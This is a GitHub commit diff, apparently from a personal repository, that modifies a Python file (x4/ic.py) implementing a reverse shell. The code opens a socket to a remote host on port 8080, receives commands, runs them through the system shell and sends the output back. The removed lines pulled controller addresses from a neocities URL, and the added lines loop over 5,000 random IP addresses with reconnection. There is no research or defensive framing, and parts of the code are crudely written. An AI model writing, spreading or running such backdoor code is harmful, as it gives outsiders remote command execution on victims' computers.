df09b5f93ebad7e7f78f7997dee20a4478fc9c0b
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-01-29 18:26:09 -0800

    Add files via upload

--- x4/ic.py
+++ x4/ic.py
@@ -1,21 +1,28 @@
 import socket
 import subprocess
 import requests
+import random
+import time
+
+def random_ip_address():
+    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
 def connect(ip):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, 8080))
     while True:
-        command = s.recv(1024)
         try:
-            output = subprocess.check_output(command, shell=True)
-            s.send(output)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, 8080))
+            while True:
+                command = s.recv(1024)
+                try:
+                    output = subprocess.check_output(command, shell=True)
+                    s.send(output)
+                except:
+                    s.send("Error executing command.\n")
+            s.close()
         except:
-            s.send("Error executing command.\n")
-    s.close()
+            print("Disconnected. Reconnecting in 5 seconds...")
+            time.sleep(5) # wait 5 seconds before attempting to reconnect
 
-url = "https://thekoolestklub.neocities.org/randomstrings"
-response = requests.get(url)
-ip_list = response.text.split("\n")
-for ip in ip_list:
-    connect(ip)
+for i in range(5000): # Connect to 5,000 random IP addresses
+    connect(random_ip_address())
